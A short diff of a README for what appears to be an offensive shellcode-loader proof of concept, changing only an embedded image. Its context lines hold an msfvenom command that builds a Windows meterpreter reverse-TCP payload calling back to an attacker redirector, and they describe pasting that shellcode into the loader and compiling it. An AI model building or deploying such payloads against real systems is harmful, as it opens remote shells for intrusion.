@@ -123,7 +123,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 
 The shellcode can then be copied into the POC by replacing the placeholder at the unsigned char, and the POC can be compiled as a x64 release.
 <p align="center">
-<img width="596" alt="image" src="https://user-images.githubusercontent.com/50073731/235358159-c43053aa-9a35-4b4e-b627-001b112e6324.png">
+<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
 
 
